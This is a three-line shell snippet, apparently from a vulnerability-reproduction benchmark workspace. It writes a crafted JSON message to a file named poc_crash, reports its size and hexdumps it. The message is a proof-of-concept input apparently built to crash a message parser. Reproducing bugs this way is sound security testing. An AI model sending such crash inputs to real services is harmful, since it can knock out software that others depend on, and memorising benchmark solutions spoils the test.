printf '%s' '{"Type":22,"Body":{"TypeId":{"Id":98},"Encoding":0}}' > /CybinGym_workdir/poc_crash
echo "written: $(wc -c </CybinGym_workdir/poc_crash) bytes"
xxd /CybinGym_workdir/poc_crash
